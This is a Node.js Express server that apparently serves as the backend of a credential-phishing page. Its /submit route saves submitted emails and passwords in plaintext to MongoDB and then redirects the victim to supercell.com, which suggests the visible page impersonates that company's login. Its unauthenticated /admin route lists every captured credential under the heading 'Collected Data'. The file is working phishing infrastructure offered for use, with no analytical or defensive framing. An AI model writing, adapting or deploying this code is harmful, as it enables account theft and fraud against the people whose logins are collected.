const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");
require("dotenv").config();

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const safeUri = process.env.MONGODB_URI.replace(/:\/\/.*:.*@/, "://****:****@");
console.log("Connecting to MongoDB at:", safeUri);

mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log("MongoDB connected"))
  .catch(err => {
    console.error("MongoDB connection error:", err.message);
    process.exit(1);
  });

const UserSchema = new mongoose.Schema({
  email: String,
  password: String,
  date: { type: Date, default: Date.now }
});
const User = mongoose.model("User", UserSchema);

// Save user details
app.post("/submit", async (req, res) => {
  try {
    const { email, password } = req.body;
    if (email && password) {
      await new User({ email, password }).save();
      res.redirect("https://supercell.com");
    } else {
      res.status(400).send("Missing email or password");
    }
  } catch (err) {
    console.error("Error saving user:", err.message);
    res.status(500).send("Error saving data");
  }
});

// Open admin panel
app.get("/admin", async (req, res) => {
  try {
    const users = await User.find().sort({ date: -1 });
    let table = `<div style="overflow-x:auto;"><table border="1" style="width:100%;border-collapse:collapse;">
      <thead><tr style="background:#f2f2f2;"><th>Email</th><th>Password</th><th>Date</th></tr></thead><tbody>`;
    users.forEach(u => table += `<tr><td>${u.email}</td><td>${u.password}</td><td>${u.date.toLocaleString()}</td></tr>`);
    table += "</tbody></table></div>";
    res.send(`<html><head><title>Admin</title>
      <style>
        body{font-family:sans-serif;padding:10px;background:#fff;}
        table{max-width:100%;font-size:16px;}
        th,td{padding:10px;text-align:left;border:1px solid #ccc;}
        tr:nth-child(even){background:#f9f9f9;}
      </style></head>
      <body><h2>Collected Data:</h2>${table}</body></html>`);
  } catch (err) {
    console.error("Error fetching users:", err.message);
    res.status(500).send("Error loading admin data");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
